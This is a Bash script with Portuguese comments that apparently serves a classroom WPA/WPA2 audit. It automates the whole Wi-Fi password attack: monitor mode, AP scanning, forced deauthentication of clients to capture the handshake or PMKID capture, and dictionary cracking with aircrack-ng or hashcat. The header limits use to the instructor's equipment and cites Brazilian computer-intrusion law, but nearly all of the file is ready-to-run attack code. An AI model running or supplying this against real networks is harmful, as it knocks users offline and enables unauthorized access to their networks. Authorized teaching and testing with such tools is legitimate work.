#!/usr/bin/env bash
#
# wifi_crack.sh - Orquestrador do fluxo de auditoria WPA/WPA2 no Kali Linux.
#
# Automatiza, usando a suite aircrack-ng + hcxtools + hashcat:
#   1. Coloca a interface em modo monitor
#   2. Escaneia e lista os APs (SSID, BSSID, canal)
#   3. Captura o handshake (com deauth opcional) OU o PMKID (sem cliente)
#   4. Converte e quebra a senha com dicionario
#
# USO ACADEMICO / AUTORIZADO: so execute contra o equipamento que o professor
# disponibilizou para a atividade. Auditar redes de terceiros sem autorizacao
# e crime (Lei 12.737/2012 - invasao de dispositivo informatico).
#
# Requisitos (Kali): aircrack-ng hcxdumptool hcxtools hashcat
#   sudo apt update && sudo apt install -y aircrack-ng hcxdumptool hcxtools hashcat
#
set -euo pipefail

# ------------------------------------------------------------------ cores
R="\033[31m"; G="\033[32m"; Y="\033[33m"; B="\033[34m"; N="\033[0m"
info()  { echo -e "${B}[*]${N} $*"; }
ok()    { echo -e "${G}[+]${N} $*"; }
warn()  { echo -e "${Y}[!]${N} $*"; }
erro()  { echo -e "${R}[x]${N} $*" >&2; }

# ------------------------------------------------------------------ defaults
IFACE=""
MODO="handshake"          # handshake | pmkid
BSSID=""
CANAL=""
CLIENTE=""                # MAC de um cliente para deauth direcionado
WORDLIST="/usr/share/wordlists/rockyou.txt"
SAIDA="captura"
DEAUTH=10

uso() {
    cat <<EOF
Uso: sudo $0 -i <interface> [opcoes]

  -i IFACE      interface wireless (ex.: wlan0)            [obrigatorio]
  -m MODO       handshake (padrao) | pmkid
  -b BSSID      MAC do AP alvo (pula o scan interativo)
  -c CANAL      canal do AP alvo
  -t CLIENTE    MAC de cliente para deauth direcionado (modo handshake)
  -w WORDLIST   dicionario (padrao: $WORDLIST)
  -o PREFIXO    prefixo dos arquivos de saida (padrao: $SAIDA)
  -d N          numero de pacotes deauth (padrao: $DEAUTH)
  -h            ajuda

Exemplos:
  sudo $0 -i wlan0                         # escaneia e guia passo a passo
  sudo $0 -i wlan0 -b AA:BB:CC:DD:EE:FF -c 6
  sudo $0 -i wlan0 -m pmkid                # sem precisar de cliente conectado
EOF
    exit "${1:-0}"
}

while getopts "i:m:b:c:t:w:o:d:h" opt; do
    case "$opt" in
        i) IFACE="$OPTARG" ;;
        m) MODO="$OPTARG" ;;
        b) BSSID="$OPTARG" ;;
        c) CANAL="$OPTARG" ;;
        t) CLIENTE="$OPTARG" ;;
        w) WORDLIST="$OPTARG" ;;
        o) SAIDA="$OPTARG" ;;
        d) DEAUTH="$OPTARG" ;;
        h) uso 0 ;;
        *) uso 1 ;;
    esac
done

# ------------------------------------------------------------------ checagens
[ "$(id -u)" -eq 0 ] || { erro "Rode como root (sudo)."; exit 1; }
[ -n "$IFACE" ] || { erro "Faltou a interface (-i)."; uso 1; }

for bin in airmon-ng airodump-ng aircrack-ng; do
    command -v "$bin" >/dev/null || { erro "'$bin' nao encontrado. Instale a suite aircrack-ng."; exit 1; }
done
[ -f "$WORDLIST" ] || warn "Wordlist '$WORDLIST' nao existe (descompacte rockyou com: sudo gunzip ${WORDLIST}.gz)."

MON=""
cleanup() {
    [ -n "$MON" ] && airmon-ng stop "$MON" >/dev/null 2>&1 || true
    systemctl start NetworkManager >/dev/null 2>&1 || true
    info "Interface restaurada."
}
trap cleanup EXIT INT TERM

# ------------------------------------------------------------------ 1. monitor
info "Liberando a interface e ligando o modo monitor..."
airmon-ng check kill >/dev/null 2>&1 || true
airmon-ng start "$IFACE" >/dev/null
# descobre o nome da interface de monitor (ex.: wlan0mon ou mesma iface)
MON=$(iw dev | awk '/Interface/{print $2}' | grep -E "mon|$IFACE" | head -n1)
MON="${MON:-$IFACE}"
ok "Modo monitor ativo em: $MON"

# ------------------------------------------------------------------ 2. scan
if [ -z "$BSSID" ] || [ -z "$CANAL" ]; then
    info "Escaneando redes por 15s (Ctrl+C para o airodump nao e necessario)..."
    timeout 15 airodump-ng "$MON" --output-format csv -w "${SAIDA}_scan" >/dev/null 2>&1 || true
    echo
    warn "Preencha o alvo com base na lista acima/no arquivo ${SAIDA}_scan-01.csv"
    read -rp "BSSID do alvo : " BSSID
    read -rp "Canal do alvo : " CANAL
fi
[ -n "$BSSID" ] && [ -n "$CANAL" ] || { erro "BSSID/canal nao definidos."; exit 1; }
info "Alvo: BSSID=$BSSID  canal=$CANAL  modo=$MODO"

# ------------------------------------------------------------------ 3. captura
HASH="${SAIDA}.hc22000"
if [ "$MODO" = "pmkid" ]; then
    command -v hcxdumptool >/dev/null || { erro "hcxdumptool nao instalado."; exit 1; }
    info "Capturando PMKID por 30s (nao precisa de cliente conectado)..."
    timeout 30 hcxdumptool -i "$MON" -w "${SAIDA}.pcapng" \
        --enable_status=1 >/dev/null 2>&1 || true
    command -v hcxpcapngtool >/dev/null || { erro "hcxpcapngtool (hcxtools) nao instalado."; exit 1; }
    hcxpcapngtool -o "$HASH" "${SAIDA}.pcapng" >/dev/null 2>&1 || true
    [ -s "$HASH" ] || { erro "Nenhum PMKID capturado. Tente o modo handshake."; exit 1; }
    ok "PMKID capturado em $HASH"
else
    info "Capturando handshake. Deixe esta captura rodando..."
    timeout 40 airodump-ng --bssid "$BSSID" -c "$CANAL" \
        -w "$SAIDA" "$MON" >/dev/null 2>&1 &
    CAP_PID=$!
    sleep 5
    info "Enviando ${DEAUTH} pacotes deauth para forcar o handshake..."
    if [ -n "$CLIENTE" ]; then
        aireplay-ng --deauth "$DEAUTH" -a "$BSSID" -c "$CLIENTE" "$MON" >/dev/null 2>&1 || true
    else
        aireplay-ng --deauth "$DEAUTH" -a "$BSSID" "$MON" >/dev/null 2>&1 || true
    fi
    wait "$CAP_PID" 2>/dev/null || true
    CAP="${SAIDA}-01.cap"
    [ -f "$CAP" ] || { erro "Arquivo de captura $CAP nao gerado."; exit 1; }
    if aircrack-ng "$CAP" 2>/dev/null | grep -q "1 handshake"; then
        ok "Handshake capturado em $CAP"
    else
        warn "Handshake pode nao ter sido capturado. Rode de novo com um cliente ativo (-t)."
    fi
fi

# ------------------------------------------------------------------ 4. quebra
echo
info "Iniciando a quebra por dicionario..."
if [ "$MODO" = "pmkid" ]; then
    command -v hashcat >/dev/null || { erro "hashcat nao instalado."; exit 1; }
    hashcat -m 22000 "$HASH" "$WORDLIST" || true
    echo; info "Senha encontrada (se houver):"
    hashcat -m 22000 "$HASH" --show || true
else
    aircrack-ng -w "$WORDLIST" -b "$BSSID" "${SAIDA}-01.cap" || true
fi

ok "Fluxo concluido. Arquivos com prefixo '${SAIDA}' ficaram no diretorio atual."
